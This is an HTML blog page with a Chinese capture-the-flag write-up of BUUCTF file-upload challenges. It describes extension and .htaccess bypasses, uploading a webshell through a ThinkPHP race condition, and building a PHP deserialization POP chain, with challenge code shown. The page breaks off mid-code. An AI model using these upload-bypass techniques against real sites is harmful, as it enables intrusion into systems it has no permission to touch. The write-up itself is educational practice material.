@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          buuctf刷题——文件上传 - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-08-18&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">3.2k</span>
+  
+  <h2 id="极客大挑战-2019-Upload">极客大挑战 2019 Upload</h2>
+<h3 id="考点">考点</h3>
+<ul>
+<li>phtml绕过后缀</li>
+<li>script绕过&lt;?</li>
+</ul>
+<h3 id="解题">解题</h3>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818233431.png" alt=""></p>
+<h2 id="ACTF2020-新生赛-Upload">ACTF2020 新生赛 Upload</h2>
+<h3 id="考点-v2">考点</h3>
+<ul>
+<li>phtml后缀绕过</li>
+</ul>
+<h3 id="解题-v2">解题</h3>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818232047.png" alt=""></p>
+<h2 id="GXYCTF2019-BabyUpload">GXYCTF2019 BabyUpload</h2>
+<h3 id="考点-v3">考点</h3>
+<ul>
+<li>.htaccess解析绕过</li>
+</ul>
+<h3 id="解题-v3">解题</h3>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819085908.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819090013.png" alt=""></p>
+<h2 id="RoarCTF-2019-SimpleUpload">RoarCTF 2019 SimpleUpload</h2>
+<h3 id="考点-v4">考点</h3>
+<ul>
+<li>条件竞争</li>
+</ul>
+<h3 id="解题-v4">解题</h3>
+<p>根据报错信息，发现是ThinkPHP3.2.4版本，从GitHub上下载下来审计一下，发现上传模块有一个问题。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819104409.png" alt=""></p>
+<p>可以看到，用户所写得代码使用时未指定files，默认为<code>$_FILES</code>，这意味着，所有<code>$_FILES</code>中的文件都会被上传。而代码只会过滤<code>$_FILES['file']</code>中的文件。所以上传两个文件，一个name为file的正常图片，另一个name为其他的webshell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+<p>最后会打印出<code>$_FILES['file']</code>的文件地址，而不会打印我们shell的地址。</p>
+<p>ThinkPHP3默认使用uniqid()函数根据时间生成文件名，两个文件上传时间相近可以爆破。</p>
+<p>最后上传的php会被后台替换成flag。</p>
+<h2 id="强网杯-2019-Upload">强网杯 2019 Upload</h2>
+<h3 id="考点-v5">考点</h3>
+<ul>
+<li>PHP反序列化POP链构造</li>
+</ul>
+<h3 id="解题-v5">解题</h3>
+<p>注册之后查看cookie发现是一个base64编码后的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:5:&quot;email&quot;;s:15:&quot;admin@admin.com&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:3:&quot;img&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+<p>扫目录得到 <code>www.tar.gz</code> 压缩包，代码审计</p>
+<p>用PHPStorm打开会发现有两个断点，应该是给的hint</p>
+<p><code>Register.php</code></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164356.png" alt=""></p>
+<p><code>Index.php</code>中有一个把cookie反序列化的地方。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164417.png" alt=""></p>
+<p>这么来看应该是构造反序列化的POP链。</p>
+<p>在<code>Profile.php</code>发现关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  